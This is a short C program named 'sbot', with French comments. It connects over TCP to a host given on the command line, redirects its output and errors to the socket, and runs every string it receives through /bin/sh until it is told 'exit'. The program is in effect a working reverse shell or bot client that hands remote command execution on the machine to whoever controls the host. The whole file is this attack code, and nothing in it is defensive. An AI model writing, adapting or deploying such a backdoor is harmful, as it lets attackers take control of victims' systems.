#define _BSD_SOURCE

/* lib standard */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>

/* lib sys */
#include <unistd.h>
#include <limits.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h> /* gethostbyname */
#include <err.h>


#include "sbot.h"


static void sbot_exec(char *cmd)
{
   int p[2];
   pid_t pid;

   pipe(p);
   pid = fork();
   if(pid == 0) /* fils */
      execl("/bin/sh", "/bin/sh", "-c", cmd, (char*)NULL);
   else if(pid != -1) /* pere */
      wait(NULL);
   return;
}

int main(int argc, char *argv[])
{
   /* buffer */
   ssize_t n;
   char buffer[SBOT_MAX];

   /* server */
   int  port = SBOT_PORT;
   int s_fd;
   struct sockaddr_in srv;
   struct hostent *host;


   if(argc != 2)
      errx(1,"Usage : %s hostname", argv[0]);


   /* on chope l'ip (query dns quoi) */
   host = gethostbyname(argv[1]);

   /* IPV4 seulement */
   if(host->h_addrtype != AF_INET)
      err(1,"Can't connect to %s :", argv[1]);

   /* On crée le socket */
   if((s_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
      err(1,"socket() :");


   srv.sin_family = AF_INET;
   srv.sin_port = htons(port);
   memcpy(&srv.sin_addr.s_addr, host->h_addr_list[0], host->h_length);

   /* on se connecte */
   if(connect(s_fd,(struct sockaddr*)&srv, sizeof(srv)) != 0)
      err(1,"connect() :");


   /* on duplique stdout et stderr sur s_fd */
   dup2(s_fd, STDOUT_FILENO);
   dup2(s_fd, STDERR_FILENO);


   /* la boucle */
   for(;;)
   {
      memset(buffer, 0, SBOT_MAX);
      n = recv(s_fd, buffer, SBOT_MAX, 0);
      if(n > 0)
      {
	 if(!strcmp(buffer, "exit"))
	    break;
	 sbot_exec(buffer);
      }
   }

   close(s_fd);

   return EXIT_SUCCESS;
}


